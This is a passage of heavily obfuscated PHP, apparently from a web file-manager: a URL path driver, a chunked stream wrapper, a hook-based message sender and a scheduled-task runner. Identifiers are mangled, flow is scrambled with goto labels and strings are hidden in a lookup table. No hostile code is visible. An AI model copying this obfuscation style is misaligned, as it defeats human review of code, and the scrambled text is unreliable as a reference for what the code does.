unset($CƒÅÈƒš¬‘); goto FÀõ°ÙäØÀ; Cøà£Å†šø: $AØ’«•Ï» =& $_SERVER[Ü˜]; $FïæÊÄ›± = $Fœğƒ®®š™[$AØ’«•Ï»[376]]; $A¶ËºÂ©¿¿ = array_to_keyvalue($FïæÊÄ›±, $AØ’«•Ï»[33], $AØ’«•Ï»[404]); goto A×‘—†ë†‚; FÀõ°ÙäØÀ: $Fœğƒ®®š™[$AØ’«•Ï»[376]] = $FïæÊÄ›±; return $Fœğƒ®®š™; goto C†™òŞÄ´Ã; C†™òŞÄ´Ã: } public function removeBySource($EîŠ«°·©†) { $eõ‚ÍÛÉÔ­ = array($_SERVER[Ü˜][419] => $EîŠ«°·©†); $this->where($eõ‚ÍÛÉÔ­)->remove(); } } goto Añ‘İ‚‰; aÛšÊÜ¨¸…: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dŸ÷¨Õ·¬À = false) { } public function exist($Fä¸ÆºäÓù) { $E·‚ª¯È‹® = $this->info($Fä¸ÆºäÓù); return $E·‚ª¯È‹®[$_SERVER[Ü˜][205]]; } public function isFile($Bˆ·ñØÅ±) { $C„ÕÂÄ‘ø½ = $this->info($Bˆ·ñØÅ±); return $C„ÕÂÄ‘ø½[$_SERVER[Ü˜][205]]; } public function isFolder($aŒ¬âÄß”É) { return !1; } public function size($Cµ¾İ‘µ‹³) { $A¨ãôÉ¸œ = $this->info($Cµ¾İ‘µ‹³); return $A¨ãôÉ¸œ[$_SERVER[Ü˜][88]]; } public function info($F¦—ô™ô–Û) { return $this->infoParse($F¦—ô™ô–Û); } public function infoAuth($BÌƒÕÑ±¾¡) { return $this->infoParse($BÌƒÕÑ±¾¡); } public function infoWithChildren($DçğÎ°ÅÍß) { return $this->infoParse($DçğÎ°ÅÍß); } public function infoFull($dÆÈ´ó°­) { return $this->infoParse($dÆÈ´ó°­); } private function infoParse($Aô¤Ü³ò À) { $B«â’ÛÄ‹á =& $_SERVER[Ü˜]; $FÑ×Î‰°¡¿ = $this->header($Aô¤Ü³ò À); if (!$FÑ×Î‰°¡¿ || !$FÑ×Î‰°¡¿[$B«â’ÛÄ‹á[719]]) { return !1; } $FÙİğ˜Ê… = _get($FÑ×Î‰°¡¿, $B«â’ÛÄ‹á[344], 0); $aôáÕ²©Ş = array($B«â’ÛÄ‹á[28] => $FÑ×Î‰°¡¿[$B«â’ÛÄ‹á[28]], $B«â’ÛÄ‹á[86] => $Aô¤Ü³ò À, $B«â’ÛÄ‹á[29] => $B«â’ÛÄ‹á[203], $B«â’ÛÄ‹á[88] => intval($FÙİğ˜Ê…), $B«â’ÛÄ‹á[178] => get_path_ext($FÑ×Î‰°¡¿[$B«â’ÛÄ‹á[28]]), $B«â’ÛÄ‹á[1257] => $FÙİğ˜Ê… > 0 && $FÑ×Î‰°¡¿[$B«â’ÛÄ‹á[1378]], $B«â’ÛÄ‹á[1258] => !1); return $aôáÕ²©Ş; } private function header($Bğ¬šÙ÷§¥) { goto BàŠ‘Âºê; F«‰Ñª‚ë: $GLOBALS[$c†Û‹à§[1379]] = !0; self::$_cacheHeader[$Bğ¬šÙ÷§¥] = url_header($Bğ¬šÙ÷§¥); $GLOBALS[$c†Û‹à§[1379]] = $D¯¼Ë¸“ñ; goto C´Ç’ÌÀÃß; C´Ç’ÌÀÃß: return self::$_cacheHeader[$Bğ¬šÙ÷§¥]; goto E“åìã¡å; BàŠ‘Âºê: $c†Û‹à§ =& $_SERVER[Ü˜]; if (isset(self::$_cacheHeader[$Bğ¬šÙ÷§¥])) { return self::$_cacheHeader[$Bğ¬šÙ÷§¥]; } $D¯¼Ë¸“ñ = isset($GLOBALS[$c†Û‹à§[1379]]) ? $GLOBALS[$c†Û‹à§[1379]] : !1; goto F«‰Ñª‚ë; E“åìã¡å: } public function hashSimple($fğÜã¡½Á, $fÑ¾Öã‹†¡ = false) { goto aªù¼Û“ƒğ; B­½ÈˆÇÚ: $f–î‘Šßšé .= $this->fileSubstr($fğÜã¡½Á, $eçæ¬‘¸óª - $B‡ï«ß¼é, $B‡ï«ß¼é); return md5($f–î‘Šßšé) . $eçæ¬‘¸óª; goto F³Ü—²šŒİ; Fœ£Ã®á£˜: if ($eçæ¬‘¸óª <= $B‡ï«ß¼é * $Eôë—Ş‡Îï) { return md5($this->fileSubstr($fğÜã¡½Á, 0, $eçæ¬‘¸óª)) . $eçæ¬‘¸óª; } $C”ßÉ¾ = intval($eçæ¬‘¸óª / $Eôë—Ş‡Îï); $f–î‘Šßšé = $B‹âàÌ¦Š½[33]; goto açï‡„–Ñƒ; CŒ«Ë¯Ã: $eçæ¬‘¸óª = $e™ÅáàÎ [$B‹âàÌ¦Š½[88]]; $B‡ï«ß¼é = 200; $Eôë—Ş‡Îï = 50; goto Fœ£Ã®á£˜; açï‡„–Ñƒ: $e¹²˜Ñ»êÇ = timeFloat(); $cà²¼·‘ù = 15; for ($AËŒÑ‡õ¾ = 0; $AËŒÑ‡õ¾ < $Eôë—Ş‡Îï; $AËŒÑ‡õ¾++) { if (timeFloat() - $e¹²˜Ñ»êÇ > $cà²¼·‘ù) { return !1; } $EÉçĞ£‹èâ = $this->fileSubstr($fğÜã¡½Á, $C”ßÉ¾ * $AËŒÑ‡õ¾, $B‡ï«ß¼é); if (!$EÉçĞ£‹èâ) { return !1; } $f–î‘Šßšé .= $EÉçĞ£‹èâ; } goto B­½ÈˆÇÚ; aªù¼Û“ƒğ: $B‹âàÌ¦Š½ =& $_SERVER[Ü˜]; $e™ÅáàÎ  = $this->info($fğÜã¡½Á); if (!$e™ÅáàÎ  || !$e™ÅáàÎ [$B‹âàÌ¦Š½[205]]) { return !1; } goto CŒ«Ë¯Ã; F³Ü—²šŒİ: } public function getContent($aèõİåÈ°Š) { return $this->fileSubstr($aèõİåÈ°Š); } public function fileSubstr($B ¹‰ƒ¬œ, $bğ†é•ª = 0, $CÜ¸ìŠºÕ = -1) { goto fãôÛ£Î…; Dö¿Š„´Ã: if ($CÜ¸ìŠºÕ === -1) { $CÜ¸ìŠºÕ = $Aƒ¦„â‚[$C›¶çÑµòë[88]]; } if ($CÜ¸ìŠºÕ == 0) { return $C›¶çÑµòë[33]; } $aï¡ßœ®ñÎ = array($C›¶çÑµòë[1380] . $bğ†é•ª . $C›¶çÑµòë[753] . ($bğ†é•ª + $CÜ¸ìŠºÕ - 1)); goto fÀ‚ÈìÂá•; fãôÛ£Î…: $C›¶çÑµòë =& $_SERVER[Ü˜]; $Aƒ¦„â‚ = $this->info($B ¹‰ƒ¬œ); if (!$Aƒ¦„â‚ || !$Aƒ¦„â‚[$C›¶çÑµòë[205]] && $Aƒ¦„â‚[$C›¶çÑµòë[88]] > 1024 * 1024 * 10) { return !1; } goto Dö¿Š„´Ã; fÀ‚ÈìÂá•: $Aâµª¶¥ÎÑ = url_request($B ¹‰ƒ¬œ, $C›¶çÑµòë[238], !1, $aï¡ßœ®ñÎ, !1, !1, 1); return $Aâµª¶¥ÎÑ[$C›¶çÑµòë[1089]] ? $Aâµª¶¥ÎÑ[$C›¶çÑµòë[1089]] : $C›¶çÑµòë[33]; goto CõŒ’ƒ¿”ä; CõŒ’ƒ¿”ä: } public function download($cŒÂİ½Ì˜”, $AôŠ°©Ù÷˜) { Downloader::start($cŒÂİ½Ì˜”, $AôŠ°©Ù÷˜); return $AôŠ°©Ù÷˜; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($FÊÈ”ùÁÊ°, $F×¿ŸâÔÜ = '') { goto DÆÕ‰—ê†ò; e´ïÜäñ: $this->pathOpen = $FÊÈ”ùÁÊ°; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto D–’»¨áÄ; DÆÕ‰—ê†ò: $this->info = $this->info($FÊÈ”ùÁÊ°); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ü˜][86]]; goto e´ïÜäñ; D–’»¨áÄ: if (!isset(self::$_chunkBuffer[$FÊÈ”ùÁÊ°])) { self::$_chunkBuffer[$FÊÈ”ùÁÊ°] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto eë­ Œª±; eë­ Œª±: } function stream_read($bİöİœ¼ß¤) { $dã‰­Ï™¿à = $this->fileSubstr($this->pose, $bİöİœ¼ß¤); $this->pose += strlen($dã‰­Ï™¿à); return $dã‰­Ï™¿à; } public function stream_tell() { return $this->pose; } public function stream_seek($B¢ƒÏñ×¦Ë, $BÓè‡õ¸ÉÛ) { $a¾¢ÑòÔÙË =& $_SERVER[Ü˜]; if ($BÓè‡õ¸ÉÛ == SEEK_SET) { $this->pose = $B¢ƒÏñ×¦Ë; } else { if ($BÓè‡õ¸ÉÛ == SEEK_CUR) { $this->pose += $B¢ƒÏñ×¦Ë; } else { if ($BÓè‡õ¸ÉÛ == SEEK_END) { $this->pose = $this->info[$a¾¢ÑòÔÙË[88]] + intval($B¢ƒÏñ×¦Ë); } } } if ($B¢ƒÏñ×¦Ë < 0) { $this->pose = $this->info[$a¾¢ÑòÔÙË[88]] + $B¢ƒÏñ×¦Ë; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ü˜][88]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($FÃÌÂ…¤™, $bãé­ö†œœ) { $E›ğ°Ü®ˆë =& $_SERVER[Ü˜]; $b¡ÍŒøÀ = $this->info($FÃÌÂ…¤™); return array($E›ğ°Ü®ˆë[1381] => 0, $E›ğ°Ü®ˆë[1382] => 0, $E›ğ°Ü®ˆë[12] => 32768 + 511, $E›ğ°Ü®ˆë[1383] => 0, $E›ğ°Ü®ˆë[1384] => 0, $E›ğ°Ü®ˆë[1385] => 0, $E›ğ°Ü®ˆë[1386] => 0, $E›ğ°Ü®ˆë[88] => $b¡ÍŒøÀ[$E›ğ°Ü®ˆë[88]], $E›ğ°Ü®ˆë[1387] => $b¡ÍŒøÀ[$E›ğ°Ü®ˆë[1256]], $E›ğ°Ü®ˆë[1343] => $b¡ÍŒøÀ[$E›ğ°Ü®ˆë[94]], $E›ğ°Ü®ˆë[1342] => $b¡ÍŒøÀ[$E›ğ°Ü®ˆë[204]], $E›ğ°Ü®ˆë[1388] => 0, $E›ğ°Ü®ˆë[1389] => 0); } static $fileInfo = array(); public function info($A£Í¯åµ½Ê) { $CÃÂÂÍÏÅ¬ = $_SERVER[Ü˜][1390]; if (isset(self::$fileInfo[$A£Í¯åµ½Ê])) { return self::$fileInfo[$A£Í¯åµ½Ê]; } if (substr($A£Í¯åµ½Ê, 0, strlen($CÃÂÂÍÏÅ¬)) != $CÃÂÂÍÏÅ¬) { return !1; } self::$fileInfo[$A£Í¯åµ½Ê] = IO::info(substr($A£Í¯åµ½Ê, strlen($CÃÂÂÍÏÅ¬))); return self::$fileInfo[$A£Í¯åµ½Ê]; } public static function read($a›¸åŠŠ·ä, $A¹ê¶ò«ï, $c§…çÂÆñ¦) { if (!isset(self::$_fopenCache[$a›¸åŠŠ·ä])) { $b»¯á·îá = new StreamWrapperIO(); $b»¯á·îá->stream_open($a›¸åŠŠ·ä); self::$_fopenCache[$a›¸åŠŠ·ä] = $b»¯á·îá; } $b»¯á·îá = self::$_fopenCache[$a›¸åŠŠ·ä]; return $b»¯á·îá->fileSubstr($A¹ê¶ò«ï, $c§…çÂÆñ¦); } public static function _read($BŠ¨´½ˆ¡Œ, $DŸª¼èƒ¤, $FÜ…òÎ·§Ù) { goto a¸Ó¹§„öÉ; a¸Ó¹§„öÉ: $bß™Ü¥¨éÔ =& $_SERVER[Ü˜]; $bÌŞÛŸ¬ˆ = fopen($BŠ¨´½ˆ¡Œ, $bß™Ü¥¨éÔ[1260]); if (!$bÌŞÛŸ¬ˆ) { return $bß™Ü¥¨éÔ[33]; } goto BƒƒôØËé‡; BƒƒôØËé‡: $eàï÷™«… = 8192; fseek($bÌŞÛŸ¬ˆ, $DŸª¼èƒ¤, SEEK_SET); $bçâÛİŞ¥à = $bß™Ü¥¨éÔ[33]; goto AŠâš‰Ü‰‡; f·İÔšÈá‰: return $bçâÛİŞ¥à; goto dŠ¤•©ºÄ²; AŠâš‰Ü‰‡: $A‹ªÄ‘ïŒö = 0; while ($A‹ªÄ‘ïŒö < $FÜ…òÎ·§Ù) { $F¾¢†‚²í° = min($eàï÷™«…, $FÜ…òÎ·§Ù - $A‹ªÄ‘ïŒö); $bçâÛİŞ¥à .= fread($bÌŞÛŸ¬ˆ, $F¾¢†‚²í°); $A‹ªÄ‘ïŒö += $F¾¢†‚²í°; } fclose($bÌŞÛŸ¬ˆ); goto f·İÔšÈá‰; dŠ¤•©ºÄ²: } public function fileSubstr($Aœ˜¸—„Æ , $D©ŠåÉ­¸) { goto f›Œìß“Ëö; a™¼Ú²›±¶: if ($Aœ˜¸—„Æ  + $D©ŠåÉ­¸ > $Eáƒ„óÏõ) { $D©ŠåÉ­¸ = $Eáƒ„óÏõ - $Aœ˜¸—„Æ ; } if ($D©ŠåÉ­¸ <= 0) { return $FÆæß—Èàã[33]; } if ($Aœ˜¸—„Æ  < 0 || $Aœ˜¸—„Æ  >= $Eáƒ„óÏõ || $D©ŠåÉ­¸ <= 0 || $D©ŠåÉ­¸ > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\x69\154\x65\x52\145\x61\x64\x20\145\162\x72\157\162\x21\x20\x73\164\141\162\x74\x3d{$Aœ˜¸—„Æ }\73\154\x65\156\147\x74\150\75{$D©ŠåÉ­¸}\73\x20\163\x69\172\145\x3d{$Eáƒ„óÏõ}\73"); } goto F¶À†—ëºÊ; f›Œìß“Ëö: $FÆæß—Èàã =& $_SERVER[Ü˜]; $Eáƒ„óÏõ = $this->info[$FÆæß—Èàã[88]]; $c¾åâè§å = $Aœ˜¸—„Æ ; goto D¾¹é®êšŠ; Fá¬…ÅŞâ¥: foreach ($eĞ‡±ãŠˆ¦ as $BÇÎËÌ”š² => $cšŠøé÷ÜÙ) { $BÇÎËÌ”š² = intval($BÇÎËÌ”š²); $cœ¹Ò«„°Á = $BÇÎËÌ”š² + strlen($cšŠøé÷ÜÙ); if ($Aœ˜¸—„Æ  >= $cœ¹Ò«„°Á) { continue; } if ($Aœ˜¸—„Æ  >= $BÇÎËÌ”š² && $Aœ˜¸—„Æ  + $D©ŠåÉ­¸ <= $cœ¹Ò«„°Á) { return substr($cšŠøé÷ÜÙ, $Aœ˜¸—„Æ  - $BÇÎËÌ”š², $D©ŠåÉ­¸); } break; } if (count($eĞ‡±ãŠˆ¦) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($FÆæß—Èàã[1391], $FÆæß—Èàã[1392] . count($eĞ‡±ãŠˆ¦) . "\x3b\x73\164\141\x72\x74\75{$Aœ˜¸—„Æ }\54\x6c\145\156\x67\164\x68\x3d{$D©ŠåÉ­¸}\73\160\157\163\145\x3a{$BÇÎËÌ”š²}\176{$cœ¹Ò«„°Á}"); throw new Exception($FÆæß—Èàã[1393]); } $A‚ƒ©±ôí› = intval($Aœ˜¸—„Æ  / $E‰ğŠ—’¡) * $E‰ğŠ—’¡; goto c¸™´¬±ˆ; D¾¹é®êšŠ: $FÀ˜¥°Á—– = $D©ŠåÉ­¸; if ($Aœ˜¸—„Æ  < 0) { $Aœ˜¸—„Æ  = $Eáƒ„óÏõ + $Aœ˜¸—„Æ ; } if ($D©ŠåÉ­¸ === !1) { $D©ŠåÉ­¸ = $Eáƒ„óÏõ - $Aœ˜¸—„Æ ; } goto a™¼Ú²›±¶; aîÏØ‘¦Ğì: $BÇÎËÌ”š² = 0; $cœ¹Ò«„°Á = 0; $cšŠøé÷ÜÙ = $FÆæß—Èàã[33]; goto Fá¬…ÅŞâ¥; c¸™´¬±ˆ: $Aí°ˆˆœ¶ = ceil(($Aœ˜¸—„Æ  + $D©ŠåÉ­¸) / $E‰ğŠ—’¡) * $E‰ğŠ—’¡ - $A‚ƒ©±ôí›; $f‹ê¢Ì = IO::fileSubstr($this->path, $A‚ƒ©±ôí›, $Aí°ˆˆœ¶); $eĞ‡±ãŠˆ¦[$A‚ƒ©±ôí› . $FÆæß—Èàã[33]] = $f‹ê¢Ì; goto AÄ¢…ÇÑ„¯; F¶À†—ëºÊ: $E‰ğŠ—’¡ = 64 * 1024; $eĞ‡±ãŠˆ¦ =& self::$_chunkBuffer[$this->path]; if (!$eĞ‡±ãŠˆ¦) { $eĞ‡±ãŠˆ¦ = array(); } goto aîÏØ‘¦Ğì; AÄ¢…ÇÑ„¯: ksort($eĞ‡±ãŠˆ¦); $B¬Œõ—ÙÒ = substr($f‹ê¢Ì, $Aœ˜¸—„Æ  - $A‚ƒ©±ôí›, $D©ŠåÉ­¸); return $B¬Œõ—ÙÒ; goto f‚×öĞ‘Àä; f‚×öĞ‘Àä: } private function log($Fö´ğ‹íïÊ, $dˆ‚…¿İƒ) { $D × »³­ =& $_SERVER[Ü˜]; $f‹¤Îõ¯Û = timeFloat() - $this->timeStart; write_log(sprintf($D × »³­[1394], $Fö´ğ‹íïÊ, $this->info[$D × »³­[28]], $f‹¤Îõ¯Û, $dˆ‚…¿İƒ), $D × »³­[1079]); } } class Message { function __construct() { } public function send($bôŒ“Ç¡È = '', $CˆÒ‹‹ÅòÌ = array(), $Cºº… íÕŞ = "\x74\145\170\x74") { goto fÇÖëË£°Ï; fÇÖëË£°Ï: $CÒ—Æùù“˜ =& $_SERVER[Ü˜]; $aöÛÍ†¯¬Ô = array($CÒ—Æùù“˜[29] => $CÒ—Æùù“˜[1395], $CÒ—Æùù“˜[724] => $bôŒ“Ç¡È); if (in_array($Cºº… íÕŞ, array($CÒ—Æùù“˜[1395], $CÒ—Æùù“˜[1396]))) { $aöÛÍ†¯¬Ô[$CÒ—Æùù“˜[29]] = $Cºº… íÕŞ; } goto aë£èÜÁ—; aë£èÜÁ—: $CˆÒ‹‹ÅòÌ = array($CÒ—Æùù“˜[1016] => isset($CˆÒ‹‹ÅòÌ[$CÒ—Æùù“˜[1016]]) ? $CˆÒ‹‹ÅòÌ[$CÒ—Æùù“˜[1016]] : $CÒ—Æùù“˜[33], $CÒ—Æùù“˜[571] => isset($CˆÒ‹‹ÅòÌ[$CÒ—Æùù“˜[571]]) ? $CˆÒ‹‹ÅòÌ[$CÒ—Æùù“˜[571]] : $CÒ—Æùù“˜[33]); if (empty($bôŒ“Ç¡È) || empty($CˆÒ‹‹ÅòÌ[$CÒ—Æùù“˜[1016]]) && empty($CˆÒ‹‹ÅòÌ[$CÒ—Æùù“˜[571]])) { return !1; } $FÓâ¢ÍğÂí = array($CÒ—Æùù“˜[1336] => $aöÛÍ†¯¬Ô, $CÒ—Æùù“˜[1397] => $CˆÒ‹‹ÅòÌ); goto cğßç¸ùÜ; cğßç¸ùÜ: Hook::trigger($CÒ—Æùù“˜[1398], $FÓâ¢ÍğÂí); goto dœƒ¥ƒä½; dœƒ¥ƒä½: } } goto F·»¨©ÍÌë; EœäËŞ¥Õˆ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto EŸ¦ğ®…ˆ; AâÉÕã‘ÑÌ: http_close(); self::valueSet($fÛ œëš®İ[1493], $fÛ œëš®İ[97]); Hook::bind($fÛ œëš®İ[1495], $fÛ œëš®İ[1496]); goto B÷‰¤ÃŒ’ß; B÷‰¤ÃŒ’ß: while (!0) { self::cacheClear(); if (self::valueGet($fÛ œëš®İ[719]) != $fÛ œëš®İ[97]) { self::valueSet($fÛ œëš®İ[1493], $fÛ œëš®İ[201]); self::log($fÛ œëš®İ[1497]); die; } self::valueSet($fÛ œëš®İ[1493], $fÛ œëš®İ[97]); self::valueSet($fÛ œëš®İ[1494], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto fù¶ÍÉ–šÆ; EŸ¦ğ®…ˆ: $fÛ œëš®İ =& $_SERVER[Ü˜]; if (self::valueGet($fÛ œëš®İ[719]) != $fÛ œëš®İ[97]) { return; } if (self::valueGet($fÛ œëš®İ[1493]) == $fÛ œëš®İ[97]) { $Aò³³Ü˜Û = self::valueGet($fÛ œëš®İ[1494]); if (time() - $Aò³³Ü˜Û > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto AâÉÕã‘ÑÌ; fù¶ÍÉ–šÆ: } public static function restart() { $eåÜ•™—Í =& $_SERVER[Ü˜]; http_close(); self::valueSet($eåÜ•™—Í[719], $eåÜ•™—Í[201]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($eåÜ•™—Í[1493], $eåÜ•™—Í[201]); self::valueSet($eåÜ•™—Í[719], $eåÜ•™—Í[97]); } public static function shutdownEvent() { $f™½ÌÊÀÅÔ =& $_SERVER[Ü˜]; self::valueSet($f™½ÌÊÀÅÔ[1493], $f™½ÌÊÀÅÔ[201]); self::log($f™½ÌÊÀÅÔ[1498]); } public static function config($bÅ‚Á¹µÏ, $E¡­ ÌŒƒ¿) { self::valueSet($_SERVER[Ü˜][719], $bÅ‚Á¹µÏ); } private static function taskRunAll() { goto a›õ…×§Î‚; a›õ…×§Î‚: $B´ƒí”…­˜ =& $_SERVER[Ü˜]; $còÎÀŒ§ÏÜ = timeFloat(); $Cä—îì¾† = Model($B´ƒí”…­˜[1499])->listData(); goto EğË•»¡™; A¡®Ò¶Ê À: self::taskQueueRun($còÎÀŒ§ÏÜ); self::closeDatabase(); goto FŸ…Éª‰ ˆ; EğË•»¡™: $F°æ‘´ÊÙ— = count($Cä—îì¾†); for ($F›¸ïÊ£™ë = 0; $F›¸ïÊ£™ë < $F°æ‘´ÊÙ—; $F›¸ïÊ£™ë++) { $dÖ¶î ¨±  = $Cä—îì¾†[$F›¸ïÊ£™ë]; if (!$dÖ¶î ¨± [$B´ƒí”…­˜[402]] || $dÖ¶î ¨± [$B´ƒí”…­˜[1500]] != $B´ƒí”…­˜[97]) { continue; } if (!self::taskTimeCheck($dÖ¶î ¨± )) { continue; } self::taskRun($dÖ¶î ¨± ); } Hook::trigger($B´ƒí”…­˜[1501]); goto A¡®Ò¶Ê À; FŸ…Éª‰ ˆ: } private static function taskQueueRun($Eìâ‹ãì‹Œ) { $dÑ„‹ß¨Ğ‡ = 10; while (!0) { $fÏÒˆğ¬‰ô = TaskQueue::run(); if ($fÏÒˆğ¬‰ô === !1) { break; } if (timeFloat() - $Eìâ‹ãì‹Œ >= $dÑ„‹ß¨Ğ‡) { break; } } } private static function taskTimeCheck($B³„‡†ß‡Ó) { goto fõöÜŠÎºï; fõöÜŠÎºï: $b‘Û¸µ„‘£ =& $_SERVER[Ü˜]; $föğ´§ÚÍ = json_decode($B³„‡†ß‡Ó[$b‘Û¸µ„‘£[207]], !0); $f§»‡¨ÜÙ’ = intval($B³„‡†ß‡Ó[$b‘Û¸µ„‘£[1494]]); goto BÁ‰É°µ³ö; BÁ‰É°µ³ö: $bˆíÆÎºÚô = strtotime($b‘Û¸µ„‘£[1502] . $föğ´§ÚÍ[$b‘Û¸µ„‘£[1503]] . $b‘Û¸µ„‘£[1504]) - strtotime($b‘Û¸µ„‘£[1505]); $A¥¤­Øò«« = time() - strtotime(date($b‘Û¸µ„‘£[1506]) . $b‘Û¸µ„‘£[1507]); $dê¶¹¾Ê… = $A¥¤­Øò«« >= $bˆíÆÎºÚô && $A¥¤­Øò«« <= $bˆíÆÎºÚô + 3600; goto f¡…õ‡à•Ï; f¡…õ‡à•Ï: switch ($föğ´§ÚÍ[$b‘Û¸µ„‘£[29]]) { case $b‘Û¸µ„‘£[1508]: if (time() - $f§»‡¨ÜÙ’ < 3600 * 24 * 30) { return !1; } if ($föğ´§ÚÍ[$b‘Û¸µ„‘£[1508]] == date($b‘Û¸µ„‘£[1509]) && $dê¶¹¾Ê…) { return !0; } break; case $b‘Û¸µ„‘£[1510]: if (time() - $f§»‡¨ÜÙ’ < 3600 * 24 * 7) { return !1; } $aá…†­£· = date($b‘Û¸µ„‘£[1511]) == 0 ? 7 : date($b‘Û¸µ„‘£[1511]); if ($föğ´§ÚÍ[$b‘Û¸µ„‘£[1510]] == $aá…†­£· && $dê¶¹¾Ê…) { return !0; } break; case $b‘Û¸µ„‘£[1503]: if (time() - $f§»‡¨ÜÙ’ < 3600 * 24) { return !1; } if ($dê¶¹¾Ê…) { return !0; } break; case $b‘Û¸µ„‘£[1512]: if (time() - $f§»‡¨ÜÙ’ >= floatval($föğ´§ÚÍ[$b‘Û¸µ„‘£[1512]]) * 60) { return !0; } break; default: break; } return !1; goto Eç·ÓãÔ‡; Eç·ÓãÔ‡: } private static function closeDatabase() { goto f¶‡«ã¨Òš; f¶‡«ã¨Òš: $BÆÈššÆÒÁ =& $_SERVER[Ü˜]; static $aƒ™ÎÃæÄ = 0; $cóÛ«³±Ï· = 1800; goto aö‡ãéÆÂ§; aö‡ãéÆÂ§: if (!$aƒ™ÎÃæÄ) { $aƒ™ÎÃæÄ = time(); } if (time() - $aƒ™ÎÃæÄ < $cóÛ«³±Ï·) { return; } $aƒ™ÎÃæÄ = time(); goto a„íì²¨ÆÈ; a„íì²¨ÆÈ: $d“òÔ¬Ïò = Model($BÆÈššÆÒÁ[511])->db($BÆÈššÆÒÁ[33]); if ($d“òÔ¬Ïò) { $d“òÔ¬Ïò->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($BÆÈššÆÒÁ[1513], $BÆÈššÆÒÁ[1514]); die; } goto fÛî»ù„»„; fÛî»ù„»„: } public static function taskRun($BÈÃ¯Ç˜”³) { goto DîèÎ£·ÚÎ; cì‘íß‰: Model($c¤Ä¯‰Ğ‘[1519])->add(array($c¤Ä¯‰Ğ‘[1520] => $c¤Ä¯‰Ğ‘[33], $c¤Ä¯‰Ğ‘[1521] => $c¤Ä¯‰Ğ‘[201], $c¤Ä¯‰Ğ‘[29] => $c¤Ä¯‰Ğ‘[1522] . $BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[402]], $c¤Ä¯‰Ğ‘[1523] => json_encode(array($c¤Ä¯‰Ğ‘[28] => $BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[28]], $c¤Ä¯‰Ğ‘[1524] => timeFloat() - $BÑ×ù£¤ÇÌ, $c¤Ä¯‰Ğ‘[300] => $d”×¶¼Ñ‡)))); self::log($c¤Ä¯‰Ğ‘[1525] . $BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[402]] . $c¤Ä¯‰Ğ‘[1526] . $d”×¶¼Ñ‡); return !0; goto Fáè®¢“Âº; BÁ¶ŸÌÛ´‡: $BÑ×ù£¤ÇÌ = timeFloat(); $d”×¶¼Ñ‡ = $c¤Ä¯‰Ğ‘[33]; switch ($BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[29]]) { case $c¤Ä¯‰Ğ‘[314]: $eï“ª…éŠ = url_request($BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[1518]], $c¤Ä¯‰Ğ‘[238], !1, !1, !1, !1, 5); $d”×¶¼Ñ‡ = strlen($eï“ª…éŠ); break; case $c¤Ä¯‰Ğ‘[237]: $d”×¶¼Ñ‡ = Hook::apply($BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[1518]]); default: break; } goto cì‘íß‰; DîèÎ£·ÚÎ: $c¤Ä¯‰Ğ‘ =& $_SERVER[Ü˜]; self::log($c¤Ä¯‰Ğ‘[1515] . $BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[402]] . $c¤Ä¯‰Ğ‘[1516] . $BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[28]] . $c¤Ä¯‰Ğ‘[1517] . $BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[1518]]); Model($c¤Ä¯‰Ğ‘[1499])->run($BÈÃ¯Ç˜”³[$c¤Ä¯‰Ğ‘[402]]); goto BÁ¶ŸÌÛ´‡; Fáè®¢“Âº: } private static function valueGet($a½®¬Œ©ˆö) { $c³ç¡¢Ä”¯ =& $_SERVER[Ü˜]; $d İì£”‘” = $c³ç¡¢Ä”¯[1527]; $bñ‡•ÜË… = Model($c³ç¡¢Ä”¯[1528])->get($a½®¬Œ©ˆö, $d İì£”‘”); if (is_null($bñ‡•ÜË…)) { Model($c³ç¡¢Ä”¯[1528])->set($c³ç¡¢Ä”¯[719], $c³ç¡¢Ä”¯[97], $d İì£”‘”); Model($c³ç¡¢Ä”¯[1528])->set($c³ç¡¢Ä”¯[1493], $c³ç¡¢Ä”¯[201], $d İì£”‘”); $bñ‡•ÜË… = Model($c³ç¡¢Ä”¯[1528])->get($a½®¬Œ©ˆö, $d İì£”‘”); } return $bñ‡•ÜË…; } private static function valueSet($e‡ñéÔµ¸, $E…ëÉàšĞŒ) { $A¾æ„²„Àø =& $_SERVER[Ü˜]; return Model($A¾æ„²„Àø[1528])->set($e‡ñéÔµ¸, $E…ëÉàšĞŒ, $A¾æ„²„Àø[1527]); } protected static function log($F×—Ã‚Ç) { write_log($F×—Ã‚Ç, $_SERVER[Ü˜][1514]); } private static function cacheClear() { $Eõ·ôÅ‘Ù¼ =& $_SERVER[Ü˜]; $d§µÃˆÁà¼ = Model($Eõ·ôÅ‘Ù¼[1528])->cacheKey($Eõ·ôÅ‘Ù¼[1527]); Cache::clearMemory($d§µÃˆÁà¼); Model($Eõ·ôÅ‘Ù¼[1499])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($böåÏ¦¥, $f‚ ˆâ†’é = '', 